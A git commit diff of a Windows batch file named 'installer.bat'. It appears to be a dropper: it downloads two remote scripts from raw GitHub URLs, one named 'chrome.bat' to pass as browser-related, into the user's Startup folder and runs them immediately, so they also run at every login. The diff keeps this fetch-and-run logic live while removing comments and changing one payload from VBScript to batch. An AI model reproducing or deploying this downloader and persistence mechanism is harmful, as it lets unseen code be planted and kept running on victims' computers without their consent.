67ea108be07e1eed42368df2e62683919ce60147
Ayamet <ayamet2029@gmail.com>
2025-06-26 15:21:22 +0300

    Update installer.bat

--- main/installer.bat
+++ main/installer.bat
@@ -1,20 +1,16 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Define URLs
-set "vbsUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/chrome.vbs"
+set "vbsUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/chrome.bat"
 set "batUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/enak.bat"
 
-:: Define paths
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "vbsFile=%startupFolder%\chrome.vbs"
+set "vbsFile=%startupFolder%\chrome.bat"
 set "batFile=%startupFolder%\enak.bat"
 
-:: Download files using PowerShell
 powershell -Command "Invoke-WebRequest -Uri '%vbsUrl%' -OutFile '%vbsFile%'"
 powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'"
 
-:: Run both files
 start "" "%vbsFile%"
 start "" "%batFile%"
 
